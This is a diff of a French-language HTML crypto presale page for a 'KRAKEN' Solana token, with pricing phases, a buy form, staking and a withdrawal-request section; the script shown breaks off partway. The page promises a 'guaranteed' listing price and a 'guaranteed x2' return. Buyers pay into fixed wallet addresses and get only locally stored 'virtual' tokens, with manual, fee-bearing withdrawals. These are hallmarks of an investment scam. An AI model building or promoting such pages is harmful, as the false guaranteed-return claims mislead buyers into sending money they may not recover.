@@ -1,228 +1,843 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>KRAKEN Token Presale</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-  <style>
-    * { font-family: 'Orbitron', sans-serif; }
-    body { 
-      background: linear-gradient(135deg, #0a0015 0%, #1a0033 50%, #2a0055 100%);
-      min-height: 100vh;
-      position: relative;
-      overflow-x: hidden;
-    }
-    body::before {
-      content: '';
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: radial-gradient(circle at 50% 50%, rgba(138, 43, 226, 0.1) 0%, transparent 50%);
-      pointer-events: none;
-      animation: pulse 8s ease-in-out infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 0.5; transform: scale(1); }
-      50% { opacity: 1; transform: scale(1.05); }
-    }
-    .glow {
-      box-shadow: 0 0 20px rgba(138, 43, 226, 0.6), 0 0 40px rgba(255, 20, 147, 0.4);
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-    @keyframes glow {
-      from { box-shadow: 0 0 20px rgba(138, 43, 226, 0.6), 0 0 40px rgba(255, 20, 147, 0.4); }
-      to { box-shadow: 0 0 30px rgba(138, 43, 226, 0.8), 0 0 60px rgba(255, 20, 147, 0.6); }
-    }
-    .neon-text {
-      text-shadow: 0 0 10px rgba(138, 43, 226, 0.8), 0 0 20px rgba(255, 20, 147, 0.6), 0 0 30px rgba(138, 43, 226, 0.4);
-    }
-    .cyber-border {
-      border: 2px solid transparent;
-      background: linear-gradient(#0a0015, #0a0015) padding-box,
-                  linear-gradient(135deg, #8a2be2, #ff1493) border-box;
-    }
-    .progress-bar {
-      background: linear-gradient(90deg, #8a2be2 0%, #ff1493 100%);
-      box-shadow: 0 0 20px rgba(138, 43, 226, 0.8);
-      animation: shimmer 2s linear infinite;
-    }
-    @keyframes shimmer {
-      0% { background-position: -100% 0; }
-      100% { background-position: 200% 0; }
-    }
-    .card {
-      background: rgba(10, 0, 21, 0.8);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(138, 43, 226, 0.3);
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #8a2be2, #ff1493);
-      transition: all 0.3s ease;
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 30px rgba(138, 43, 226, 0.6);
-    }
-    .listing-banner {
-      background: linear-gradient(135deg, rgba(138, 43, 226, 0.2), rgba(255, 20, 147, 0.2));
-      border: 2px solid #8a2be2;
-      animation: borderGlow 2s ease-in-out infinite;
-    }
-    @keyframes borderGlow {
-      0%, 100% { border-color: #8a2be2; }
-      50% { border-color: #ff1493; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KRAKEN Token - Presale Officielle</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 50%, rgba(138, 43, 226, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 20, 147, 0.15) 0%, transparent 50%);
+            animation: pulse 8s ease-in-out infinite;
+            z-index: 0;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
+        header { text-align: center; padding: 40px 20px; margin-bottom: 40px; border-bottom: 2px solid rgba(138, 43, 226, 0.3); }
+        .logo { font-size: 4rem; font-weight: 900; background: linear-gradient(135deg, #8a2be2, #ff1493); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: 0 0 30px rgba(138, 43, 226, 0.5); margin-bottom: 10px; letter-spacing: 8px; }
+        .subtitle { font-size: 1.2rem; color: #ff1493; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 20px; }
+        .tagline { font-size: 0.9rem; color: #a0a0a0; max-width: 600px; margin: 0 auto; }
+        .presale-section { background: linear-gradient(135deg, rgba(138, 43, 226, 0.1), rgba(255, 20, 147, 0.1)); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 20px; padding: 40px; margin-bottom: 40px; box-shadow: 0 0 50px rgba(138, 43, 226, 0.2); position: relative; overflow: hidden; }
+        .presale-header { text-align: center; margin-bottom: 40px; position: relative; z-index: 1; }
+        .presale-title { font-size: 2.5rem; color: #ff1493; margin-bottom: 10px; text-transform: uppercase; }
+        .presale-status { display: inline-block; background: linear-gradient(135deg, #8a2be2, #ff1493); padding: 10px 30px; border-radius: 30px; font-size: 1rem; font-weight: bold; animation: glow 2s ease-in-out infinite; }
+        @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(255, 20, 147, 0.5); } 50% { box-shadow: 0 0 40px rgba(255, 20, 147, 1); } }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 40px; position: relative; z-index: 1; }
+        .stat-card { background: rgba(20, 20, 30, 0.8); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 15px; padding: 25px; text-align: center; transition: all 0.3s ease; }
+        .stat-card:hover { transform: translateY(-5px); border-color: #ff1493; box-shadow: 0 10px 30px rgba(255, 20, 147, 0.3); }
+        .stat-label { font-size: 0.9rem; color: #a0a0a0; text-transform: uppercase; margin-bottom: 10px; }
+        .stat-value { font-size: 2rem; font-weight: bold; background: linear-gradient(135deg, #8a2be2, #ff1493); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .progress-container { margin-bottom: 40px; position: relative; z-index: 1; }
+        .progress-header { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 0.9rem; }
+        .progress-bar { width: 100%; height: 40px; background: rgba(20, 20, 30, 0.8); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 20px; overflow: hidden; position: relative; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #8a2be2, #ff1493); border-radius: 18px; transition: width 0.5s ease; position: relative; overflow: hidden; }
+        .phases-table { width: 100%; border-collapse: collapse; background: rgba(20, 20, 30, 0.8); border-radius: 15px; overflow: hidden; }
+        .phases-table th { background: linear-gradient(135deg, #8a2be2, #ff1493); padding: 20px; text-align: left; font-weight: bold; text-transform: uppercase; }
+        .phases-table td { padding: 20px; border-bottom: 1px solid rgba(138, 43, 226, 0.2); }
+        .buy-section { background: rgba(20, 20, 30, 0.9); border: 2px solid rgba(138, 43, 226, 0.5); border-radius: 20px; padding: 40px; max-width: 600px; margin: 0 auto 40px; position: relative; z-index: 1; }
+        .buy-title { font-size: 2rem; color: #ff1493; text-align: center; margin-bottom: 30px; text-transform: uppercase; }
+        .network-selector { display: flex; gap: 15px; margin-bottom: 30px; }
+        .network-btn { flex: 1; padding: 20px; background: rgba(138, 43, 226, 0.1); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 15px; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; }
+        .network-btn:hover { background: rgba(138, 43, 226, 0.2); transform: translateY(-3px); }
+        .network-btn.active { background: linear-gradient(135deg, #8a2be2, #ff1493); border-color: #ff1493; box-shadow: 0 0 20px rgba(255, 20, 147, 0.5); }
+        .input-group { margin-bottom: 25px; }
+        .input-label { display: block; margin-bottom: 10px; color: #a0a0a0; font-size: 0.9rem; text-transform: uppercase; }
+        .input-field { width: 100%; padding: 18px; background: rgba(20, 20, 30, 0.8); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 10px; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1.2rem; transition: all 0.3s ease; }
+        .input-field:focus { outline: none; border-color: #ff1493; box-shadow: 0 0 20px rgba(255, 20, 147, 0.3); }
+        .calculation { background: rgba(138, 43, 226, 0.1); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 10px; padding: 20px; margin-bottom: 25px; text-align: center; }
+        .calculation-label { color: #a0a0a0; font-size: 0.9rem; margin-bottom: 5px; }
+        .calculation-value { font-size: 2rem; font-weight: bold; color: #ff1493; }
+        .wallet-address { background: rgba(20, 20, 30, 0.8); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 10px; padding: 15px; margin-bottom: 25px; font-size: 0.8rem; word-break: break-all; color: #a0a0a0; }
+        .buy-button { width: 100%; padding: 25px; background: linear-gradient(135deg, #8a2be2, #ff1493); border: none; border-radius: 15px; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1.3rem; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 30px rgba(255, 20, 147, 0.5); }
+        .buy-button:hover { transform: translateY(-3px); box-shadow: 0 0 50px rgba(255, 20, 147, 0.8); }
+        .wallet-connect-btn { margin-top: 20px; padding: 15px 40px; background: linear-gradient(135deg, #8a2be2, #ff1493); border: none; border-radius: 30px; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(138, 43, 226, 0.5); }
+        .wallet-connect-btn:hover { transform: translateY(-3px); box-shadow: 0 0 30px rgba(255, 20, 147, 0.8); }
+        .wallet-connect-btn.connected { background: linear-gradient(135deg, #4caf50, #45a049); }
+        footer { text-align: center; padding: 40px 20px; border-top: 2px solid rgba(138, 43, 226, 0.3); color: #a0a0a0; font-size: 0.9rem; }
+        footer a { color: #ff1493; text-decoration: none; transition: color 0.3s ease; }
+        footer a:hover { color: #8a2be2; }
+        @media (max-width: 768px) {
+            .logo { font-size: 2.5rem; }
+            .presale-title { font-size: 1.8rem; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .phases-table { font-size: 0.8rem; }
+            .phases-table th, .phases-table td { padding: 12px 8px; }
+            .network-selector { flex-direction: column; }
+        }
+    </style>
 </head>
-<body class="text-white">
-  <div class="container mx-auto px-4 py-8 max-w-6xl relative z-10">
-    
-    <!-- Header -->
-    <div class="flex justify-between items-center mb-8">
-      <h1 class="text-5xl font-bold neon-text">KRAKEN TOKEN</h1>
-      <button id="connectWallet" class="btn-primary px-6 py-3 rounded-lg font-bold">
-        Connecter Wallet Solana
-      </button>
-    </div>
-
-    <!-- Bannière Listing -->
-    <div class="listing-banner rounded-xl p-6 mb-8 text-center">
-      <h2 class="text-3xl font-bold mb-2 neon-text">🚀 LISTING GARANTI À $0.12</h2>
-      <p class="text-xl text-purple-300">Token listé sur les DEX Solana dès la fin de la Phase 5</p>
-      <p class="text-lg text-pink-400 mt-2">💎 Achetez maintenant à $0.06 = x2 garanti au listing !</p>
-    </div>
-
-    <!-- Stats -->
-    <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
-      <div class="card p-6 rounded-xl text-center cyber-border">
-        <div class="text-sm text-purple-400 mb-2">Prix Actuel</div>
-        <div class="text-3xl font-bold text-pink-500" id="currentPrice">...</div>
-      </div>
-      <div class="card p-6 rounded-xl text-center cyber-border">
-        <div class="text-sm text-purple-400 mb-2">Tokens Vendus</div>
-        <div class="text-3xl font-bold text-purple-400" id="tokensSold">...</div>
-      </div>
-      <div class="card p-6 rounded-xl text-center cyber-border">
-        <div class="text-sm text-purple-400 mb-2">Prochain Prix</div>
-        <div class="text-3xl font-bold text-pink-500" id="nextPrice">...</div>
-      </div>
-      <div class="card p-6 rounded-xl text-center cyber-border">
-        <div class="text-sm text-purple-400 mb-2">Max Supply</div>
-        <div class="text-3xl font-bold text-purple-400">10M</div>
-      </div>
-    </div>
-
-    <!-- Progress Bar -->
-    <div class="card p-6 rounded-xl mb-8 cyber-border">
-      <div class="flex justify-between mb-2">
-        <span class="text-sm text-purple-400">Phase <span id="currentPhase">-</span></span>
-        <span class="text-sm text-pink-400" id="progressPercent">0%</span>
-      </div>
-      <div class="w-full bg-gray-800 rounded-full h-4 overflow-hidden">
-        <div class="progress-bar h-full rounded-full" id="progressBar" style="width: 0%"></div>
-      </div>
-    </div>
-
-    <!-- Balance User -->
-    <div id="userBalance" class="hidden card p-6 rounded-xl mb-8 cyber-border">
-      <h3 class="text-xl font-bold mb-4 text-purple-400">Votre Balance</h3>
-      <div class="grid grid-cols-3 gap-4">
-        <div class="text-center">
-          <div class="text-sm text-gray-400">Total</div>
-          <div class="text-2xl font-bold text-purple-400" id="totalBalance">0</div>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">KRAKEN</div>
+            <div class="subtitle">⚡ Token Presale Officielle</div>
+            <div class="tagline">Plonge dans l'univers cyberpunk de Kraken — Mine, explore, capture, influence la cité</div>
+            <button class="wallet-connect-btn" id="walletBtn" onclick="connectWallet()">
+                🔌 Connecter Wallet Solana
+            </button>
+            <div id="walletInfo" style="display: none; margin-top: 15px; padding: 15px; background: rgba(138, 43, 226, 0.2); border: 2px solid rgba(138, 43, 226, 0.5); border-radius: 15px; max-width: 500px; margin-left: auto; margin-right: auto;">
+                <div style="color: #4caf50; font-weight: bold; margin-bottom: 5px;">✅ Wallet connecté</div>
+                <div style="color: #a0a0a0; font-size: 0.9rem; word-break: break-all;" id="connectedAddress"></div>
+            </div>
+        </header>
+        <div class="presale-section">
+            <div class="presale-header">
+                <h1 class="presale-title">Presale Live</h1>
+                <div class="presale-status">🔥 PHASE 1 EN COURS</div>
+            </div>
+            <div style="background: linear-gradient(135deg, rgba(138, 43, 226, 0.2), rgba(255, 20, 147, 0.2)); border: 3px solid #ff1493; border-radius: 20px; padding: 30px; margin-bottom: 30px; text-align: center; box-shadow: 0 0 40px rgba(255, 20, 147, 0.4); animation: pulse-border 2s infinite;">
+                <div style="font-size: 1.5rem; color: #fff; margin-bottom: 10px; font-weight: bold;">
+                    🚀 LISTING GARANTI À 0.12$ 🚀
+                </div>
+                <div style="color: #a0a0a0; font-size: 1rem; line-height: 1.8;">
+                    Le token KRAKEN sera listé sur les exchanges majeurs<br>
+                    dès la fin de la Phase 5 (prix 0.12$)<br>
+                    <strong style="color: #ff1493;">👉 Achète maintenant à partir de 0.06$ et profite du x2 potentiel !</strong>
+                </div>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Prix Actuel</div>
+                    <div class="stat-value">$0.060</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Prix Suivant</div>
+                    <div class="stat-value">$0.075</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Tokens Vendus</div>
+                    <div class="stat-value" id="tokensSold">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Supply Total</div>
+                    <div class="stat-value">10M</div>
+                </div>
+            </div>
+            <div class="progress-container">
+                <div class="progress-header">
+                    <span>Progression Globale</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+                </div>
+            </div>
+            <div class="phases-container">
+                <h2 class="phases-title">📊 Phases de la Presale</h2>
+                <table class="phases-table">
+                    <thead>
+                        <tr>
+                            <th>Phase</th>
+                            <th>Tokens</th>
+                            <th>Prix</th>
+                            <th>Statut</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="phase-current">
+                            <td>Phase 1</td>
+                            <td>2,000,000</td>
+                            <td>$0.060</td>
+                            <td>🟢 EN COURS</td>
+                        </tr>
+                        <tr>
+                            <td>Phase 2</td>
+                            <td>2,000,000</td>
+                            <td>$0.075</td>
+                            <td>⏳ À venir</td>
+                        </tr>
+                        <tr>
+                            <td>Phase 3</td>
+                            <td>2,000,000</td>
+                            <td>$0.090</td>
+                            <td>⏳ À venir</td>
+                        </tr>
+                        <tr>
+                            <td>Phase 4</td>
+                            <td>2,000,000</td>
+                            <td>$0.105</td>
+                            <td>⏳ À venir</td>
+                        </tr>
+                        <tr>
+                            <td>Phase 5</td>
+                            <td>2,000,000</td>
+                            <td>$0.120</td>
+                            <td>⏳ À venir</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
-        <div class="text-center">
-          <div class="text-sm text-gray-400">Staké</div>
-          <div class="text-2xl font-bold text-pink-500" id="stakedBalance">0</div>
+        <div class="buy-section">
+            <h2 class="buy-title">💎 Acheter KRAKEN</h2>
+            <div class="network-selector">
+                <button class="network-btn active" id="solBtn" onclick="selectNetwork('solana')">
+                    ⚡ Solana
+                </button>
+                <button class="network-btn" id="ethBtn" onclick="selectNetwork('ethereum')">
+                    💠 Ethereum
+                </button>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Montant à envoyer</label>
+                <input type="number" class="input-field" id="amountInput" placeholder="0.00" min="0" step="0.01" oninput="calculateTokens()">
+            </div>
+            <div class="calculation">
+                <div class="calculation-label">Vous recevrez</div>
+                <div class="calculation-value" id="tokensReceived">0</div>
+                <div class="calculation-label">KRAKEN tokens</div>
+            </div>
+            <div class="wallet-address" id="walletAddress">
+                📬 Adresse de paiement :<br>
+                <strong>4P4oWnPgW9DHk251scY5ndo9J4HjEiyKPUgchwrRKC9o</strong>
+            </div>
+            <button class="buy-button" onclick="buyTokens()">
+                💎 Acheter maintenant
+            </button>
         </div>
-        <div class="text-center">
-          <div class="text-sm text-gray-400">Disponible</div>
-          <div class="text-2xl font-bold text-green-400" id="availableBalance">0</div>
+        <!-- Section Staking -->
+        <div class="presale-section">
+            <div class="presale-header">
+                <h1 class="presale-title">🔒 Staking KRAKEN</h1>
+                <div class="presale-status">💎 GAGNE DES RÉCOMPENSES</div>
+            </div>
+            <div class="staking-info">
+                <p style="text-align: center; color: #a0a0a0; margin-bottom: 30px;">
+                    Stake tes tokens KRAKEN virtuels et gagne des intérêts. Plus tu stakes longtemps, plus tu gagnes !
+                </p>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card staking-card" onclick="selectStakingPlan(30, 5)">
+                    <div class="staking-badge">30 JOURS</div>
+                    <div class="stat-value">5% APR</div>
+                    <div class="stat-label">Flexible</div>
+                </div>
+                <div class="stat-card staking-card" onclick="selectStakingPlan(60, 12)">
+                    <div class="staking-badge">60 JOURS</div>
+                    <div class="stat-value">12% APR</div>
+                    <div class="stat-label">Recommandé</div>
+                </div>
+                <div class="stat-card staking-card" onclick="selectStakingPlan(90, 20)">
+                    <div class="staking-badge">90 JOURS</div>
+                    <div class="stat-value">20% APR</div>
+                    <div class="stat-label">🔥 Maximum</div>
+                </div>
+            </div>
+            <div class="buy-section" style="margin-top: 30px;">
+                <div class="input-group">
+                    <label class="input-label">Montant à staker (tokens virtuels)</label>
+                    <input type="number" class="input-field" id="stakeAmount" placeholder="0" min="0" oninput="calculateStakingRewards()">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Durée sélectionnée</label>
+                    <div class="input-field" style="background: rgba(138, 43, 226, 0.1); cursor: not-allowed;">
+                        <span id="selectedPlan">Sélectionne un plan ci-dessus</span>
+                    </div>
+                </div>
+                <div class="calculation">
+                    <div class="calculation-label">Récompenses estimées</div>
+                    <div class="calculation-value" id="stakingRewards">0</div>
+                    <div class="calculation-label">KRAKEN tokens</div>
+                </div>
+                <div style="background: rgba(255, 20, 147, 0.1); border: 2px solid rgba(255, 20, 147, 0.3); border-radius: 10px; padding: 15px; margin-bottom: 20px; font-size: 0.85rem; color: #ff1493;">
+                    ⚠️ Les tokens stakés sont <strong>virtuels</strong> jusqu'à ce que tu demandes un retrait. Les récompenses sont calculées automatiquement.
+                </div>
+                <button class="buy-button" onclick="stakeTokens()" id="stakeBtn" disabled>
+                    🔒 Staker mes tokens
+                </button>
+                <div style="margin-top: 30px; padding-top: 30px; border-top: 2px solid rgba(138, 43, 226, 0.3);">
+                    <h3 style="color: #ff1493; margin-bottom: 15px; text-align: center;">📊 Mes Stakes Actifs</h3>
+                    <div id="activeStakes" style="color: #a0a0a0; text-align: center; padding: 20px;">
+                        Aucun stake actif pour le moment
+                    </div>
+                </div>
+            </div>
         </div>
-      </div>
+        <!-- Section Retrait -->
+        <div class="presale-section">
+            <div class="presale-header">
+                <h1 class="presale-title">💸 Demande de Retrait</h1>
+                <div class="presale-status">🔄 TOKENS VIRTUELS → RÉELS</div>
+            </div>
+            <div style="background: rgba(255, 20, 147, 0.1); border: 2px solid rgba(255, 20, 147, 0.3); border-radius: 15px; padding: 25px; margin-bottom: 30px;">
+                <h3 style="color: #ff1493; margin-bottom: 15px;">🚀 Listing sur les exchanges</h3>
+                <div style="color: #a0a0a0; line-height: 2;">
+                    <p style="font-size: 1.1rem; margin-bottom: 10px;">
+                        📊 <strong style="color: #fff;">Le token KRAKEN sera listé sur les exchanges majeurs une fois la Phase 5 terminée (prix 0.12$)</strong>
+                    </p>
+                    <ul style="list-style-position: inside; margin-top: 15px;">
+                        <li>✅ Listing immédiat après la fin de la presale</li>
+                        <li>✅ Accès aux DEX Solana (Raydium, Orca, Jupiter)</li>
+                        <li>✅ Négociations en cours avec CEX majeurs</li>
+                        <li>✅ Prix de listing : $0.12 minimum</li>
+                    </ul>
+                    <div style="background: rgba(138, 43, 226, 0.2); border-left: 4px solid #8a2be2; padding: 15px; margin-top: 20px; border-radius: 5px;">
+                        💡 <strong>Early Investors :</strong> En achetant maintenant à partir de $0.06, tu bénéficies d'un potentiel x2 dès le listing !
+                    </div>
+                </div>
+            </div>
+            <div style="background: rgba(255, 20, 147, 0.1); border: 2px solid rgba(255, 20, 147, 0.3); border-radius: 15px; padding: 25px; margin-bottom: 30px;">
+                <h3 style="color: #ff1493; margin-bottom: 15px;">📝 Comment ça marche ?</h3>
+                <ul style="color: #a0a0a0; line-height: 2; list-style-position: inside;">
+                    <li>✅ Tes tokens achetés sont d'abord <strong>virtuels</strong></li>
+                    <li>✅ Tu peux les staker et gagner des récompenses</li>
+                    <li>✅ Quand tu veux les récupérer en <strong>tokens réels</strong>, tu fais une demande</li>
+                    <li>✅ Après validation, on t'envoie les vrais KRAKEN sur ton wallet Solana</li>
+                </ul>
+            </div>
+            <div class="buy-section">
+                <div class="stats-grid" style="margin-bottom: 30px;">
+                    <div class="stat-card">
+                        <div class="stat-label">Balance Virtuelle</div>
+                        <div class="stat-value" id="virtualBalance">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">En Staking</div>
+                        <div class="stat-value" id="stakedBalance">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Disponible</div>
+                        <div class="stat-value" id="availableBalance">0</div>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Adresse Solana de réception</label>
+                    <input type="text" class="input-field" id="withdrawAddress" placeholder="Colle ton adresse Solana ici">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Montant à retirer</label>
+                    <input type="number" class="input-field" id="withdrawAmount" placeholder="0" min="0">
+                </div>
+                <div style="background: rgba(138, 43, 226, 0.1); border: 2px solid rgba(138, 43, 226, 0.3); border-radius: 10px; padding: 15px; margin-bottom: 20px; font-size: 0.85rem; color: #a0a0a0;">
+                    ⏱️ <strong>Délai de traitement :</strong> 24-48h<br>
+                    💰 <strong>Frais de retrait :</strong> 2% (minimum 100 KRAKEN)<br>
+                    📊 <strong>Minimum retrait :</strong> 1,000 KRAKEN
+                </div>
+                <button class="buy-button" onclick="requestWithdrawal()">
+                    🚀 Demander un retrait
+                </button>
+                <div style="margin-top: 30px; padding-top: 30px; border-top: 2px solid rgba(138, 43, 226, 0.3);">
+                    <h3 style="color: #ff1493; margin-bottom: 15px; text-align: center;">📋 Historique des Retraits</h3>
+                    <div id="withdrawHistory" style="color: #a0a0a0; text-align: center; padding: 20px;">
+                        Aucun retrait demandé
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer>
+            <p>⚡ KRAKEN Token — Propulsé par Solana</p>
+            <p style="margin-top: 10px;">
+                <a href="https://kraken-city.fr" target="_blank">kraken-city.fr</a> |
+                <a href="#" onclick="alert('Lien Twitter à venir')">Twitter</a> |
+                <a href="#" onclick="alert('Lien Telegram à venir')">Telegram</a>
+            </p>
+            <p style="margin-top: 20px; font-size: 0.8rem;">
+                ⚠️ Assurez-vous d'envoyer uniquement depuis votre propre wallet<br>
+                Les tokens seront crédités en virtuel après vérification de la transaction
+            </p>
+        </footer>
     </div>
+    <script>
+        // Configuration
+        const MAX_SUPPLY = 10000000;
+        const SOLANA_ADDRESS = "4P4oWnPgW9DHk251scY5ndo9J4HjEiyKPUgchwrRKC9o";
+        const ETH_ADDRESS = "0xcA904E7d9b87b3d13F9A0600180C6d1aB8fae7b3";
+        const PHASES = [
+            { max: 2000000, price: 0.060 },
+            { max: 4000000, price: 0.075 },
+            { max: 6000000, price: 0.090 },
+            { max: 8000000, price: 0.105 },
+            { max: 10000000, price: 0.120 }
+        ];
+        let currentNetwork = 'solana';
+        let tokensSold = 0;
+        let userData = {
+            virtualBalance: 0,
+            stakedBalance: 0,
+            stakes: [],
+            withdrawals: []
+        };
+        let connectedWallet = null;
+        let walletProvider = null;
+        let selectedStakingDays = 0;
+        let selectedStakingAPY = 0;
 
-    <div class="text-center text-gray-400 py-8">
-      <p>✅ Connecté au backend: <span class="text-green-400 font-bold">http://158.178.197.42</span></p>
-      <p class="text-sm mt-2">Les données sont maintenant sauvegardées sur le serveur</p>
-    </div>
+        // Détecter Phantom Wallet
+        function getProvider() {
+            if ('phantom' in window) {
+                const provider = window.phantom?.solana;
+                if (provider?.isPhantom) {
+                    return provider;
+                }
+            }
+            return null;
+        }
 
-  </div>
+        // Connecter le wallet
+        async function connectWallet() {
+            try {
+                const provider = getProvider();
+                if (!provider) {
+                    alert('❌ Phantom Wallet non détecté!\n\nInstalle Phantom depuis:\nhttps://phantom.app');
+                    window.open('https://phantom.app', '_blank');
+                    return;
+                }
+                walletProvider = provider;
+                const resp = await provider.connect();
+                connectedWallet = resp.publicKey.toString();
+                document.getElementById('walletBtn').textContent = '✅ Wallet connecté';
+                document.getElementById('walletBtn').classList.add('connected');
+                document.getElementById('walletBtn').onclick = disconnectWallet;
+                document.getElementById('connectedAddress').textContent = connectedWallet;
+                document.getElementById('walletInfo').style.display = 'block';
+                document.getElementById('withdrawAddress').value = connectedWallet;
+                await loadUserDataForWallet(connectedWallet);
+            } catch (err) {
+                console.error('Erreur connexion wallet:', err);
+                if (err.code === 4001) {
+                    alert('❌ Connexion refusée par l\'utilisateur');
+                } else {
+                    alert('❌ Erreur de connexion au wallet');
+                }
+            }
+        }
 
-  <script>
-    const API_URL = 'http://158.178.197.42';
-    const SOLANA_ADDRESS = "4P4oWnPgW9DHk251scY5ndo9J4HjEiyKPUgchwrRKC9o";
-    
-    let connectedWallet = null;
+        // Déconnecter le wallet
+        async function disconnectWallet() {
+            try {
+                if (walletProvider) {
+                    await walletProvider.disconnect();
+                }
+                connectedWallet = null;
+                walletProvider = null;
+                document.getElementById('walletBtn').textContent = '🔌 Connecter Wallet Solana';
+                document.getElementById('walletBtn').classList.remove('connected');
+                document.getElementById('walletBtn').onclick = connectWallet;
+                document.getElementById('walletInfo').style.display = 'none';
+                document.getElementById('withdrawAddress').value = '';
+            } catch (err) {
+                console.error('Erreur déconnexion:', err);
+            }
+        }
 
-    // Charger stats au démarrage
-    async function loadStats() {
-      try {
-        const res = await fetch(`${API_URL}/api/stats`);
-        const data = await res.json();
-        
-        document.getElementById('currentPrice').textContent = `$${data.currentPrice.toFixed(3)}`;
-        document.getElementById('tokensSold').textContent = data.totalSold.toLocaleString();
-        document.getElementById('nextPrice').textContent = data.nextPrice ? `$${data.nextPrice.toFixed(3)}` : 'Final';
-        document.getElementById('currentPhase').textContent = data.currentPhase;
-        document.getElementById('progressPercent').textContent = `${data.progress.toFixed(2)}%`;
-        document.getElementById('progressBar').style.width = `${data.progress}%`;
-      } catch (err) {
-        console.error('Erreur stats:', err);
-        alert('Erreur connexion au backend !');
-      }
-    }
+        // Charger les données pour un wallet spécifique
+        async function loadUserDataForWallet(wallet) {
+            try {
+                const result = await window.storage.get(`kraken_user_${wallet}`);
+                if (result && result.value) {
+                    userData = JSON.parse(result.value);
+                    updateBalances();
+                    renderActiveStakes();
+                    renderWithdrawHistory();
+                } else {
+                    userData = {
+                        virtualBalance: 0,
+                        stakedBalance: 0,
+                        stakes: [],
+                        withdrawals: []
+                    };
+                    updateBalances();
+                    renderActiveStakes();
+                    renderWithdrawHistory();
+                }
+            } catch (error) {
+                console.log('Pas de données pour ce wallet');
+                userData = {
+                    virtualBalance: 0,
+                    stakedBalance: 0,
+                    stakes: [],
+                    withdrawals: []
+                };
+                updateBalances();
+            }
+        }
 
-    // Connexion wallet
-    document.getElementById('connectWallet').addEventListener('click', async () => {
-      if (!window.solana?.isPhantom) {
-        window.open('https://phantom.app/', '_blank');
-        return;
-      }
+        // Sauvegarder les données
+        async function saveUserData() {
+            try {
+                if (connectedWallet) {
+                    await window.storage.set(`kraken_user_${connectedWallet}`, JSON.stringify(userData));
+                } else {
+                    await window.storage.set('kraken_user_data', JSON.stringify(userData));
+                }
+            } catch (error) {
+                console.error('Erreur de sauvegarde:', error);
+            }
+        }
 
-      try {
-        const resp = await window.solana.connect();
-        connectedWallet = resp.publicKey.toString();
-        
-        // Enregistrer dans le backend
-        await fetch(`${API_URL}/api/user/register`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ wallet: connectedWallet })
-        });
-        
